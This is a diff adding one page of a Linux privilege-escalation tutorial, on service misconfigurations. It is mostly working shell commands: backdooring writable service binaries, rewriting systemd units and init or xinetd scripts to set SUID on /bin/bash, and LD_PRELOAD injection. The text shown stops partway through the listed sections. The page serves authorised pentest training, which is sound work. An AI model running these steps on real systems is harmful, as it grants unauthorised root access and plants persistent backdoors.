@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 9 of 10. Inspect unit files, writable binaries and unsafe service execution contexts.">
+  <title>Part 09: Service Misconfigurations | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html" aria-current="page"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 09</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 09</p>
+        <h1>Service Misconfigurations</h1>
+        <p class="g-deck">Inspect unit files, writable binaries and unsafe service execution contexts.</p>
+        <div class="g-chapter-meta">
+          <span>17 min read</span>
+          <span>14 sections</span>
+          <span>38 code blocks</span>
+          <span>Part 09 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>14 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#service-misconfigurations-for-privilege-escalation" data-toc-link>Service Misconfigurations for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-service-misconfigurations" data-toc-link>1. Understanding Service Misconfigurations</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-vulnerable-services" data-toc-link>2. Enumeration: Finding Vulnerable Services</a><a class="g-toc-link depth-3" href="#3-writable-service-binaries" data-toc-link>3. Writable Service Binaries</a><a class="g-toc-link depth-3" href="#4-writable-service-configuration-files" data-toc-link>4. Writable Service Configuration Files</a><a class="g-toc-link depth-3" href="#5-service-user-misconfigurations" data-toc-link>5. Service User Misconfigurations</a><a class="g-toc-link depth-3" href="#6-dangerous-service-options" data-toc-link>6. Dangerous Service Options</a><a class="g-toc-link depth-3" href="#7-service-file-inclusion-import" data-toc-link>7. Service File Inclusion/Import</a><a class="g-toc-link depth-3" href="#8-service-dependencies" data-toc-link>8. Service Dependencies</a><a class="g-toc-link depth-3" href="#9-inetd-xinetd-wrapper-scripts" data-toc-link>9. Inetd / Xinetd Wrapper Scripts</a><a class="g-toc-link depth-3" href="#10-service-socket-activation" data-toc-link>10. Service Socket Activation</a><a class="g-toc-link depth-3" href="#11-service-temporary-files" data-toc-link>11. Service Temporary Files</a><a class="g-toc-link depth-3" href="#12-practical-exploitation-workflow" data-toc-link>12. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#13-defensive-measures" data-toc-link>13. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="service-misconfigurations-for-privilege-escalation">Service Misconfigurations for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#service-misconfigurations-for-privilege-escalation">#</a></h2>
+<p>Service misconfigurations are a prime privilege escalation vector where <strong>system services running as root</strong> have insecure configurations, writable binaries, or dangerous settings. Unlike cron jobs, services are constantly running and can be triggered immediately.</p>
+<hr/>
+<h3 id="1-understanding-service-misconfigurations">1. Understanding Service Misconfigurations<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-service-misconfigurations">#</a></h3>
+<p><strong>What Are System Services?</strong></p>
+<ul>
+<li>Background processes that start at boot or on-demand</li>
+<li>Run under specific users (often root or system users)</li>
+<li>Controlled by init systems (System V init, Upstart, Systemd)</li>
+<li>Typically found in <code>/etc/init.d/</code>, <code>/etc/systemd/system/</code>, <code>/etc/xinetd.d/</code></li>
+</ul>
+<p><strong>Why They're Dangerous</strong>:</p>
+<ul>
+<li>Services run with <strong>root privileges</strong></li>
+<li>They're <strong>constantly running</strong> (no need to wait for cron)</li>
+<li>Misconfigurations are <strong>persistent</strong> across reboots</li>
+<li>Often overlooked in security audits</li>
+</ul>
+<hr/>
+<h3 id="2-enumeration-finding-vulnerable-services">2. Enumeration: Finding Vulnerable Services<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-vulnerable-services">#</a></h3>
+<p><strong>List All Running Services</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running
+systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--all
+
+<span class="c1"># SysV init services</span>
+service<span class="w"> </span>--status-all
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/init.d/
+
+<span class="c1"># Upstart services (older systems)</span>
+initctl<span class="w"> </span>list
+</code></pre></div>
+<p><strong>Check Service Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find writable service files</span>
+find<span class="w"> </span>/etc/systemd/system<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/lib/systemd/system<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/etc/init.d<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/etc/xinetd.d<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check configuration directories</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/systemd/system/
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/init.d/
+</code></pre></div>
+<p><strong>Check Service Binaries</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find services using writable binaries</span>
+<span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-legend<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">binary</span><span class="o">=</span><span class="k">$(</span>systemctl<span class="w"> </span>show<span class="w"> </span><span class="nv">$service</span><span class="w"> </span>-p<span class="w"> </span>ExecStart<span class="w"> </span>--no-pager<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="o">=</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[!] Writable binary: </span><span class="nv">$binary</span><span class="s2"> (service: </span><span class="nv">$service</span><span class="s2">)"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+<p><strong>Check Service Configuration</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Look for dangerous options</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"ExecStart"</span><span class="w"> </span>/etc/systemd/system/*.service<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/usr/bin\|/bin/"</span>
+
+<span class="c1"># Check for insecure permissions</span>
+find<span class="w"> </span>/etc<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.conf"</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>root
+</code></pre></div>
+<p><strong>Automated Tools</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS service checks</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="s2">"Services"</span>
+
+<span class="c1"># Manual comprehensive check</span>
+<span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-legend<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== </span><span class="nv">$service</span><span class="s2"> ==="</span>
+<span class="w">    </span>systemctl<span class="w"> </span>show<span class="w"> </span><span class="nv">$service</span><span class="w"> </span>-p<span class="w"> </span>ExecStart,User,Group,ProtectSystem,PrivateTmp
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="3-writable-service-binaries">3. Writable Service Binaries<a aria-label="Link to this section" class="g-anchor" href="#3-writable-service-binaries">#</a></h3>
+<p>If a service's binary is writable, replace it with a malicious version.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find writable service binaries</span>
+find<span class="w"> </span>/usr/bin<span class="w"> </span>/usr/sbin<span class="w"> </span>/usr/local/bin<span class="w"> </span>/usr/local/sbin<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 2. Identify which service uses it</span>
+<span class="k">for</span><span class="w"> </span>binary<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>find<span class="w"> </span>/usr/bin<span class="w"> </span>/usr/sbin<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== </span><span class="nv">$binary</span><span class="s2"> ==="</span>
+<span class="w">    </span>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span>/etc/systemd/system/<span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-5
+<span class="k">done</span>
+
+<span class="c1"># 3. Create malicious replacement</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/malicious_binary<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s"># Execute backdoor</span>
+<span class="s">cp /bin/bash /tmp/shell</span>
+<span class="s">chmod +s /tmp/shell</span>
+<span class="s"># Execute real binary to maintain service functionality</span>
+<span class="s">/usr/bin/real_binary "$@"</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/malicious_binary
+
+<span class="c1"># 4. Replace the binary (if writable)</span>
+cp<span class="w"> </span>/tmp/malicious_binary<span class="w"> </span>/usr/bin/vulnerable_service
+
+<span class="c1"># 5. Restart service or wait for next execution</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>vulnerable_service
+<span class="c1"># OR kill -9 &lt;PID&gt; and let systemd restart it</span>
+</code></pre></div>
+<p><strong>Example - Apache with Writable Binary</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># /usr/sbin/apache2 is world-writable</span>
+cp<span class="w"> </span>/tmp/backdoor<span class="w"> </span>/usr/sbin/apache2
+systemctl<span class="w"> </span>restart<span class="w"> </span>apache2
+<span class="c1"># /tmp/shell becomes SUID root</span>
+</code></pre></div>
+<hr/>
+<h3 id="4-writable-service-configuration-files">4. Writable Service Configuration Files<a aria-label="Link to this section" class="g-anchor" href="#4-writable-service-configuration-files">#</a></h3>
+<h4 id="a-systemd-unit-files">A. Systemd Unit Files<a aria-label="Link to this section" class="g-anchor" href="#a-systemd-unit-files">#</a></h4>
+<p><strong>Exploitation - Modify ExecStart</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find writable service file</span>
+find<span class="w"> </span>/etc/systemd/system<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 2. Edit service file</span>
+vim<span class="w"> </span>/etc/systemd/system/backup.service
+<span class="c1"># Change ExecStart to:</span>
+<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">'chmod +s /bin/bash &amp;&amp; /usr/bin/real_backup'</span>
+
+<span class="c1"># 3. Reload and restart</span>
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>backup.service
+</code></pre></div>
+<p><strong>Exploitation - Add ExecStartPre</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add pre-execution command</span>
+cat<span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/systemd/system/mysql.service<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'</span>
+<span class="s">EOF</span>
+
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>mysql
+</code></pre></div>
+<p><strong>Exploitation - Override Files</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create override directory</span>
+mkdir<span class="w"> </span>/etc/systemd/system/mysql.service.d/
+
+<span class="c1"># Create override file</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/etc/systemd/system/mysql.service.d/override.conf<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">[Service]</span>
+<span class="s">ExecStart=</span>
+<span class="s">ExecStart=/bin/bash -c 'chmod +s /bin/bash &amp;&amp; /usr/sbin/mysqld'</span>
+<span class="s">EOF</span>
+
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>mysql
+</code></pre></div>
+<p><strong>Exploitation - Environment Variables</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add environment variable to service</span>
+cat<span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/systemd/system/service.service<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">[Service]</span>
+<span class="s">Environment="LD_PRELOAD=/tmp/backdoor.so"</span>
+<span class="s">EOF</span>
+
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>service
+</code></pre></div>
+<hr/>
+<h4 id="b-init-scripts-etc-init-d">B. Init Scripts (/etc/init.d/)<a aria-label="Link to this section" class="g-anchor" href="#b-init-scripts-etc-init-d">#</a></h4>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find writable init scripts</span>
+find<span class="w"> </span>/etc/init.d<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 2. Modify the script</span>
+vim<span class="w"> </span>/etc/init.d/backup
+<span class="c1"># Add at the beginning:</span>
+chmod<span class="w"> </span>+s<span class="w"> </span>/bin/bash
+
+<span class="c1"># 3. Restart service</span>
+service<span class="w"> </span>backup<span class="w"> </span>restart
+<span class="c1"># OR</span>
+/etc/init.d/backup<span class="w"> </span>restart
+</code></pre></div>
+<p><strong>Example Injection</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Original script</span>
+<span class="c1">#!/bin/sh</span>
+<span class="c1"># /etc/init.d/backup</span>
+<span class="k">case</span><span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="k">in</span>
+<span class="w">  </span>start<span class="o">)</span>
+<span class="w">    </span>/usr/local/bin/backup.sh
+<span class="w">    </span><span class="p">;;</span>
+
+<span class="c1"># Modified script</span>
+<span class="c1">#!/bin/sh</span>
+chmod<span class="w"> </span>+s<span class="w"> </span>/bin/bash
+<span class="k">case</span><span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="k">in</span>
+<span class="w">  </span>start<span class="o">)</span>
+<span class="w">    </span>/usr/local/bin/backup.sh
+<span class="w">    </span><span class="p">;;</span>
+</code></pre></div>
+<hr/>
+<h4 id="c-xinetd-services-etc-xinetd-d">C. xinetd Services (/etc/xinetd.d/)<a aria-label="Link to this section" class="g-anchor" href="#c-xinetd-services-etc-xinetd-d">#</a></h4>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find writable xinetd configuration</span>
+find<span class="w"> </span>/etc/xinetd.d<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 2. Modify service</span>
+vim<span class="w"> </span>/etc/xinetd.d/tftp
+<span class="c1"># Add or modify:</span>
+<span class="nv">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/bin/bash
+<span class="nv">server_args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'chmod +s /bin/bash &amp;&amp; /usr/sbin/in.tftpd'</span>
+
+<span class="c1"># 3. Restart xinetd</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>xinetd
+<span class="c1"># OR</span>
+service<span class="w"> </span>xinetd<span class="w"> </span>restart
+</code></pre></div>
+<hr/>
+<h3 id="5-service-user-misconfigurations">5. Service User Misconfigurations<a aria-label="Link to this section" class="g-anchor" href="#5-service-user-misconfigurations">#</a></h3>
+<h4 id="a-service-running-as-root">A. Service Running as Root<a aria-label="Link to this section" class="g-anchor" href="#a-service-running-as-root">#</a></h4>
+<p><strong>Check Service User</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Systemd</span>
+systemctl<span class="w"> </span>show<span class="w"> </span>service_name<span class="w"> </span>-p<span class="w"> </span>User
+systemctl<span class="w"> </span>show<span class="w"> </span>service_name<span class="w"> </span>-p<span class="w"> </span>Group
+
+<span class="c1"># SysV</span>
+ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>service_name
+<span class="c1"># Check the user column</span>
+</code></pre></div>
+<p><strong>Exploitation - Writable Service Directories</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If a root service writes to a directory you own</span>
+<span class="c1"># Example: /var/log/service/ is owned by user</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/var/log/service/script.sh
+<span class="c1"># Service executes everything in that directory</span>
+</code></pre></div>
+<hr/>
+<h4 id="b-service-with-sudo-permissions">B. Service with Sudo Permissions<a aria-label="Link to this section" class="g-anchor" href="#b-service-with-sudo-permissions">#</a></h4>
+<p>Some services are configured to run with sudo without password.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check sudo -l for service commands</span>
+sudo<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>service
+
+<span class="c1"># Example: user can run service command as root</span>
+sudo<span class="w"> </span>/usr/sbin/service<span class="w"> </span>apache2<span class="w"> </span>restart
+<span class="c1"># If you can modify apache2 service configuration</span>
+<span class="c1"># Create malicious init script</span>
+</code></pre></div>
+<hr/>
+<h3 id="6-dangerous-service-options">6. Dangerous Service Options<a aria-label="Link to this section" class="g-anchor" href="#6-dangerous-service-options">#</a></h3>
+<h4 id="a-systemd-s-protectsystem-and-privatetmp">A. Systemd's <code>ProtectSystem</code> and <code>PrivateTmp</code><a aria-label="Link to this section" class="g-anchor" href="#a-systemd-s-protectsystem-and-privatetmp">#</a></h4>
+<p>If these are set to <code>false</code> or <code>off</code>, services can write to system directories.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check service settings</span>
+systemctl<span class="w"> </span>show<span class="w"> </span>service_name<span class="w"> </span>-p<span class="w"> </span>ProtectSystem<span class="w"> </span>-p<span class="w"> </span>PrivateTmp
+
+<span class="c1"># If ProtectSystem=off, the service can write to /etc, /usr, etc.</span>
+<span class="c1"># If PrivateTmp=off, the service shares /tmp with other processes</span>
+</code></pre></div>
+<h4 id="b-systemd-s-rootdirectory-rootimage">B. Systemd's <code>RootDirectory</code> / <code>RootImage</code><a aria-label="Link to this section" class="g-anchor" href="#b-systemd-s-rootdirectory-rootimage">#</a></h4>
+<p>If a service runs in a container/chroot, escaping is possible.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if service uses chroot</span>
+systemctl<span class="w"> </span>show<span class="w"> </span>service_name<span class="w"> </span>-p<span class="w"> </span>RootDirectory
+
+<span class="c1"># If set to a writable directory, you can modify the chroot</span>
+</code></pre></div>
